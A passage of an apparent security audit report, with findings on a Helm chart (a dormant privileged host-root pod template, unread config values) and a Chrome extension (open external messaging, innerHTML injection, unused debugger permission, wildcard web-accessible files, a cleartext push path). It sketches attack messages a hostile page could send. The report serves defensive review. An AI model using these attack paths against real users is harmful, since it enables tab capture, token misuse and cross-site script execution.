findings.evidence: The named template defines `hostPID: true`, `hostNetwork: true`, `privileged: true`, `runAsUser: 0` and a `hostPath` mount of `/` at `/host`. No template in the chart includes it - the comment says it is kept for the runbook diff - but a named template in `templates/` is addressable by `include` from anywhere in this chart and from any chart that takes it as a subchart.
findings.impact: The most dangerous pod spec in the repository is one `include` away from being rendered, and it is stored where Helm looks rather than in documentation. Anything that renders it grants root on the node with the host filesystem attached.
findings.recommendation: Move the fragment to the runbook or to a git tag and delete it from `templates/`; if it must stay for reference, keep it in a `.md` file, which Helm does not treat as a template.

findings.title: Chart values that declare bounds and behaviour have no reader in any template
findings.evidence: Three keys have zero readers across `templates/`: `upstream.timeoutSeconds: 15`, `debug.verboseAudit: false` and `reconciler.schedule: "0 2 * * *"`. The neighbouring keys in the same blocks are all consumed - `upstream.baseUrl` and `upstream.insecureSkipTLSVerify` become env vars on deployment.yaml:52 and 54, `debug.pprofEnabled` gates service.yaml:16 - so the omission is per-key, not a chart that ignores its values. `reconciler.schedule` has no reader because the chart contains no CronJob at all, which also removes the stated justification for `automountServiceAccountToken: true` on the ServiceAccount (rbac.yaml:8-10).
findings.impact: An operator who sets a timeout on the clearing-house call, or turns on verbose audit logging during an incident, changes nothing and gets no error - the knob is documented by its presence and enforced by nothing (`WEB-23`). The ServiceAccount keeps token automounting on for a workload the chart never creates, so the mounted token is available to any future pod that adopts the account. Whether the ledger binary applies its own internal default timeout cannot be settled from this tree.
findings.recommendation: Render `upstream.timeoutSeconds` and `debug.verboseAudit` into the container environment beside the values that already are; delete `reconciler.schedule` or add the CronJob it configures, and set `automountServiceAccountToken: false` on the ServiceAccount until a workload needs it.

findings.title: Any web page can drive the extension's privileged commands
findings.evidence: `externally_connectable: {"matches": ["*://*/*"]}` opens `chrome.runtime.sendMessage(extensionId, ...)` to every origin, and `background.js:54` routes `onMessageExternal` into the same `handle()` as the trusted internal channel, ignoring the `sender` argument entirely - no origin check, no command allowlist for external callers. `handle` is not a read-only surface: it captures tabs, pushes to the workspace API with the stored bearer token, and forwards notes to the content script. `capture` additionally honours a caller-supplied `message.tabId` (line 24), so the target is not limited to the active tab.
findings.impact: A page the user merely visits sends `{cmd:'capture', tabId:N}` and receives a PNG data URL of a tab the user has open - a bank, a webmail, an internal console - together with its title and URL, then `{cmd:'push'}` to write into the workspace under the user's token, and `{cmd:'annotate'}` to reach the DOM injection below on whatever tab is active. The extension ID is discoverable from any page because of the wildcard `web_accessible_resources`.
findings.recommendation: Narrow `externally_connectable.matches` to the workspace origin only, and in `onMessageExternal` validate `sender.origin` against that origin and restrict external callers to a read-only subset (`ping`), keeping `capture`, `push` and `annotate` on the internal channel.

findings.title: Message-supplied note is written to innerHTML in every page the content script runs on
findings.evidence: `node.innerHTML = ...${note}` interpolates `message.note` as markup. The comment states the assumption - "the popup has already turned **bold**, _italic_ and line breaks into tags" - and the popup does sanitise (popup.js:70, escape-then-wrap), but the sanitiser sits on the sender's side of a channel the content script does not authenticate: the listener accepts any message with `cmd === 'render-note'` and never inspects `_sender`. `background.js:32-38` forwards `message.note` from `handle()` unchanged, and `handle()` is reachable from `onMessageExternal`. The content script is declared on `<all_urls>` (manifest.json:29).
findings.impact: An attacker page sends `{cmd:'annotate', note:''}`; the background worker forwards it and the payload is parsed as HTML inside the active tab's document. `innerHTML` runs the `onerror` handler in the page's main world, not the isolated content-script world, so this is script execution in the origin of whatever site the user is on - session-riding on any origin, chosen by the attacker.
findings.recommendation: Never build the bubble with `innerHTML`: set `textContent`, or construct the small allowed tag set with `createElement`. Sanitise on the receiving side rather than trusting the sender, and have the content script reject messages whose sender is not this extension.

findings.title: The `debugger` permission is requested and never used
findings.evidence: `"debugger"` is listed in `permissions`. A search across the whole extension for `debugger` returns only this manifest line - no `chrome.debugger.attach`, `sendCommand` or `detach` anywhere in `background.js`, `content.js`, `popup.js`, `lib/sync.js` or `lib/allowlist.js`. Screen capture is done with `chrome.tabs.captureVisibleTab`, which needs `activeTab`, not `debugger`.
findings.impact: `chrome.debugger` is the strongest permission in the extension API: it attaches the Chrome DevTools Protocol to any tab, which reads HttpOnly cookies, evaluates script in any origin and intercepts network traffic - it is not bounded by host permissions the way ordinary APIs are. Held with no use, it is pure blast-radius for a compromise of the extension or of its update channel, and given the wildcard `externally_connectable` above, the extension is reachable by every page on the web.
findings.recommendation: Remove `"debugger"` from the manifest; if a future feature needs it, request it with `chrome.permissions.request` at the moment of use so it is not standing.

findings.title: Every extension file is web-accessible to every origin
findings.evidence: `{"resources": ["*"], "matches": ["<all_urls>"]}` - the wildcard covers the whole package, including `background.js`, `lib/sync.js`, `lib/allowlist.js` and `popup.html`, with no origin restriction. Only the icons are actually referenced from a page context.
findings.impact: Any site fetches a known resource path and learns the extension ID and version from a successful load, which is the discovery step the `externally_connectable` wildcard above needs to address its messages. It also hands an attacker the exact source of the message handlers and the sync endpoints to work against, and exposes `popup.html` to being framed by a hostile page.
findings.recommendation: List only the resources a page genuinely needs - here, the icons - and set `matches` to the workspace origin rather than `<all_urls>`.

findings.title: Legacy push path sends clips over cleartext HTTP to a caller-supplied host
findings.evidence: `fetch(\`http://${host}/v1/clips\`, ...)` - the scheme is a hardcoded `http:` and the host is a parameter. The comment says nothing reaches it any more; the function has no callers in this tree, and MV3 host permissions (`https://api.tabsnap.example/*` only) would subject the request to CORS, so it is not currently a live path.
findings.impact: Any caller reinstated here posts screen captures - which are exactly the sensitive content the extension exists to collect - unencrypted to a host it does not authenticate, readable and modifiable by anything on the path.
findings.recommendation: Delete the function with the manifest bump the comment already plans; a self-hosted appliance should be supported with https and an explicit host permission, never with an http fallback.
